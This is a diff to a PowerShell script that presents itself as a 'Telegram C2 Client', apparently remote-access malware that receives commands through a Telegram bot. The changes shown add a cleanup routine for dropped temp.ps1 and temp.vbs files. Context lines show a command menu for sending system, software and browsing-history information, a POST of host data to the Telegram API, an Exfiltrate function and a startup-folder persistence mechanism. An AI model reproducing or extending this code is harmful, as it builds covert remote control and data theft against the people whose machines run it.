@@ -50,13 +50,10 @@ $glass = [char]::ConvertFromUtf32(0x1F50D)
 $cmde = [char]::ConvertFromUtf32(0x1F517)
 Write-Output "Starting Telegram C2 Client"
 Sleep 10
-$path3 = "$env:TEMP\temp.ps1"
-$path2 = "$env:APPDATA\Microsoft\Windows\temp.ps1"
-$path1 = "$env:APPDATA\Microsoft\Windows\temp.vbs"
-if(!(Test-Path $path1)){
-remove-item -FilePath $path2 -Force
-remove-item -FilePath $path1 -Force
-remove-item -FilePath $path3 -Force
+if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){
+rm -path "$env:TEMP\temp.ps1"
+rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1"
+rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs"
 }
 
 # Get Chat ID from the bot
@@ -93,6 +90,7 @@ Systeminfo   : Send System info as text file
 Softwareinfo   : Send Software info as text file
 Historyinfo   : Send History info as text file
 RemovePersistance   : Remove Startup Persistance
+CleanUp    : Delete Files made the by script
 ==============================================
 ============ $glass Examples and Info $glass ===========
 ==============================================
@@ -120,6 +118,12 @@ $contents = "$comp $env:COMPUTERNAME $closed Connection Closed"
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 exit
+}
+
+Function Cleanup{
+rm -path "$env:TEMP\temp.ps1"
+rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1"
+rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs"
 }
 
 Function Exfiltrate {
@@ -274,11 +278,9 @@ Write-Output "Persistance Added."
 
 
 Function RemovePersistance{
-
 rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
 rm -Path "$env:APPDATA\Microsoft\Windows\copy.ps1"
 Write-Output "Uninstalled."
-
 }
 
 Function SystemInfo{
